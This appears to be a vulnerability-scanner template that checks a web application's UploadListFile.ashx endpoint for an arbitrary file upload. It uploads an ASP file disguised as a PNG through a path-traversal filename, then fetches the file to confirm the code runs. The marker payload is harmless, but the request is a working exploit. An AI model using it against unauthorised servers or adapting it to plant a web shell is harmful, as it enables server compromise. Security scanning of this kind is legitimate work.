
id: lcgs-UploadListFile-upload

info:
  name: msk-template
  author: msk
  severity: high

variables:
  filename: "{{to_lower(rand_base(10))}}"
  boundary: "{{to_lower(rand_base(20))}}"

http:
  - raw:
      - |
        POST /cwbase/EP/ListContent/UploadListFile.ashx?uptype=attslib&keyid=1&key1=1&key2=1 HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Connection: close
        Content-Length: 275
        Content-Type: multipart/form-data; boundary=---------------------------{{boundary}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0

        -----------------------------{{boundary}}
        Content-Disposition: form-data; name="file"; filename="../../../../../../{{filename}}.asp"
        Content-Type: image/png

        <% response.write("{{randstr}}")%>
        -----------------------------{{boundary}}--

      - |
        GET /cwbase/{{filename}}.asp HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"{{randstr}}")